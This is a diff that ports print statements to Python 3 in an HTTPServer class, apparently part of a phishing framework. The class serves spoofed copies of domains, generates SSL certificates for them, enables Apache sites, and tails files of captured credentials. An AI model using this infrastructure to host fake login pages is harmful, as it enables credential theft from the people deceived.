@@ -30,7 +30,7 @@ class HTTPServer(object):
 
         if start:
             for file in self.cred_files_to_print:
-                print "[+] Will be printing creds coming in on {}".format(file)
+                print ("[+] Will be printing creds coming in on {}".format(file))
                 self.cred_printing_processes.append(Popen("tail -F {}".format(file).split()))
         else:
             for printer in self.cred_printing_processes:
@@ -48,7 +48,7 @@ class HTTPServer(object):
     # This method grabs the pages present in the data/spoofpages/{domain_name}
     def add_site(self, domain_name):
         if not os.path.exists("data/spoofpages/" + domain_name):
-            print "[-] Cannot add '{}' because corresponding folder is missing from 'data/spoofpages/'".format(domain_name)
+            print ("[-] Cannot add '{}' because corresponding folder is missing from 'data/spoofpages/'".format(domain_name))
             return
 
         spoofpage_path = "data/spoofpages/" + domain_name
@@ -126,7 +126,7 @@ class HTTPServer(object):
                                                                                     domain = domain_name)
 
         if self.ssl:
-            print "[+] Creating ssl private key and certificate for '{}'".format(domain_name)
+            print ("[+] Creating ssl private key and certificate for '{}'".format(domain_name))
             Popen(openssl_keygen_string.split(), stdout=DEVNULL, stderr=DEVNULL).wait()
         with open(apache_http_config_file, "w") as http_config:
             http_config.write(apache_http_config_string)
@@ -134,3 +134,4 @@ class HTTPServer(object):
             https_config.write(apache_https_config_string)
         Popen("a2ensite {http_config}".format(http_config = apache_http_config_file.split("/")[-1]).split(), stdout=DEVNULL, stderr=DEVNULL)
         Popen("a2ensite {https_config}".format(https_config = apache_https_config_file.split("/")[-1]).split(), stdout=DEVNULL, stderr=DEVNULL)
+
